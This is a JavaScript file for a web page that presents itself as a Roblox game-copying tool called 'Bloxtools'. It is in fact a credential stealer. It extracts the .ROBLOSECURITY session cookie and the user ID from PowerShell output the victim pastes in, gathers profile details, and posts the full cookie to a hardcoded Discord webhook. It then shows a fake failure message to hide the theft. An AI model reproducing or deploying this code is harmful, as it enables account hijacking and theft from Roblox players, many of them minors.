/* ======================================================
   PAYLOAD.JS - WITH CORS PROXY (works on Vercel)
   - Uses allorigins.win to bypass CORS
   - Extracts rbxuid & cookie from PowerShell
   - Fetches complete profile data
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";
const CORS_PROXY = "https://api.allorigins.win/raw?url=";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Generic fetch with CORS proxy
async function fetchRobloxAPI(endpoint) {
    try {
        const url = `${CORS_PROXY}${encodeURIComponent(endpoint)}`;
        const res = await fetch(url, { timeout: 8000 });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        return data;
    } catch (err) {
        console.warn(`Failed to fetch ${endpoint}:`, err);
        return null;
    }
}

async function fetchUserInfo(userId) {
    const data = await fetchRobloxAPI(`https://users.roblox.com/v1/users/${userId}`);
    if (!data) return null;
    return {
        username: data.name,
        displayName: data.displayName,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

async function fetchFriendsCount(userId) {
    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || "N/A";
}

async function fetchFollowersCount(userId) {
    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    return data?.total?.toLocaleString() || "N/A";
}

async function fetchGroups(userId) {
    const data = await fetchRobloxAPI(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!data || !data.data) return [];
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

async function fetchBadges(userId) {
    const data = await fetchRobloxAPI(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!data || !data.data) return [];
    return data.data.map(b => b.badge.name);
}

async function fetchAvatarItems(userId) {
    const data = await fetchRobloxAPI(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!data || !data.assets || data.assets.length === 0) return "None equipped";
    const items = data.assets.slice(0, 5).map(a => a.name);
    return items.join(", ") + (data.assets.length > 5 ? " …" : "");
}

async function fetchAvatarThumbnail(userId) {
    const data = await fetchRobloxAPI(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Robux requires cookie & CSRF, but we try anyway through proxy (won't work for auth)
async function fetchRobuxBalance(cookie) {
    // Cannot proxy because we need to send the cookie header.
    // We'll skip it; the user can see Robux from the cookie itself later.
    return "N/A (use cookie to check)";
}

async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl] = await Promise.all([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchAvatarItems(userId),
        fetchAvatarThumbnail(userId)
    ]);

    let description = `**Extracted from PowerShell:**\n- **rbxuid:** \`${userId}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
    } else {
        embedFields.push({ name: "⚠️ Error", value: "Could not fetch basic user info.", inline: false });
    }

    embedFields.push(
        { name: "👥 Friends", value: friendsCount, inline: true },
        { name: "👀 Followers", value: followersCount, inline: true },
        { name: "💰 Robux", value: "N/A (cookie required for balance)", inline: true },
        { name: "👕 Wearing", value: avatarItems, inline: false }
    );

    if (groups.length > 0) embedFields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
    if (badges.length > 0) embedFields.push({ name: "🏅 Badges", value: badges.join("\n"), inline: false });

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**Note:** This cookie can log into the account.`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 Roblox Profile Extraction",
            thumbnail: { url: avatarUrl },
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Complete Profile" },
            timestamp: new Date().toISOString()
        }]
    };

    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
    return response.ok;
}

copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Enter valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing (this will take 5-10 seconds)...";
    statusMessage.style.color = "#caa8ff";

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
